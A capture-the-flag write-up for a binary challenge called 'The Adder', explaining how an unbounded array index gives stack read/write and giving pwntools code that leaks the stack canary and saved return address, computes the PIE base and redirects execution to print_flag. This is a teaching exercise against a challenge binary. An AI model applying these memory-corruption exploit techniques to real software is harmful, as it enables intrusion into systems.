# The Adder

**Category:** Mitigations

## Overview
```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

```text
printf("Current sum is: %llu\n", sum_table[i - 1]);
    puts("What you wanna do?");
    puts("1) Add value");
    puts("2) Sum history");
    puts("3) Quit");
    printf("> ");
```
This is a snippet of the decompiled code, as we can see the binary lets us add a value to the sum, print the sum history and quit the execution

### 1 - Add value
Implements a cumulative sum, at each iteration the current element is summed to the previous.

### 2 - Sum history
Prints the history of the sums

The binary also contains a `print_flag` function

## Analysis

We can see from the decompiled code that `i`, that is the current position of the sum operation, is not bounded.
This means that, using this logic, we can leak and write arbitrary values on the stack.
The idea is to leak the canary, saved_ebp and saved_eip to overwrite the saved_eip with the address of `print_flag`.

## Vulnerability
Arbitrary read and write on the stack


## Exploitation

First we have to reach the canary with the sum operation, we want to get to the canary with 0 as current sum.
In this way the value of the canary is not corrupted by the previous values of the addition.

```python
for _ in range(9):
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvuntil(b"Number: ")
    r.sendline(b"1")
    r.recvuntil(b"[y/n]\n")
    r.sendline(b"y")
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"-9")
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")
```

Now we leak the canary. We make the scanf fail by passing a character instead of an integer: the conversion fails without writing the slot, so the binary prints its current content.
The problem is that the character stays in the buffer and it is consumed by the following scanf.
Since it is not "y", it triggers the else branch that zeroes the slot.

```text
__isoc99_scanf("%llu", &sum_table[i]);
  v2 = sum_table[i];
  if ( v2 )
  {
    printf("Are you sure you want me to add %llu? [y/n]\n", sum_table[i]);
    __isoc99_scanf(" %c", &choice);
    if ( choice == 'y' )
    {
      sum_table[i] += sum_table[i - 1];
      LOBYTE(v2) = 1;
    }
    else
    {
      sum_table[i] = 0;
      LOBYTE(v2) = 0;
    }
  }
  return v2;
```

So we have to manually reinsert the value each time we leak something.

```python
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"a")
r.recvuntil(b"to add ")
canary = r.recvuntil(b"?")[:-1]
canary = int(canary)
canary_hex = hex(canary)
print("Canary: ",canary_hex)
r.recvuntil(b"[y/n]\n")
r.sendline(b"n")


r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(bytes(str(canary),'utf-8'))
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")
```

Now the same logic is done for the saved EBP.

Now we leak and overwrite the saved EIP, note that we have to handle the PIE option for compiling.
We leak the EIP that corresponds to main+39 and we use it to compute the base of the binary

```python
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"a")
r.recvuntil(b"to add ")
saved_eip = r.recvuntil(b"?")[:-1]
saved_eip = int(saved_eip)
saved_eip_hex = hex(saved_eip)
print("Saved_EIP: ",saved_eip_hex)
r.recvuntil(b"[y/n]\n")
r.sendline(b"n")

saved_eip_main = int(saved_eip) -39
saved_eip_main_hex = hex(saved_eip_main)
base_main = int(saved_eip_main_hex,16) #computing base address of main from main+39
CHALL.address = base_main - CHALL.symbols['main']
print_flag_address = CHALL.symbols['print_flag']
print("Base address: ", hex(CHALL.address))
print("print_flag: ",hex(print_flag_address))

difference = saved_eip - print_flag_address
#insert address of print_flag as saved EIP
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(bytes(str(saved_eip_main - saved_ebp + difference - 0x1f5),'utf-8'))
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")

#quit to jump to saved_eip
r.recvuntil(b">")
r.sendline(b"3")


r.interactive()
```


 

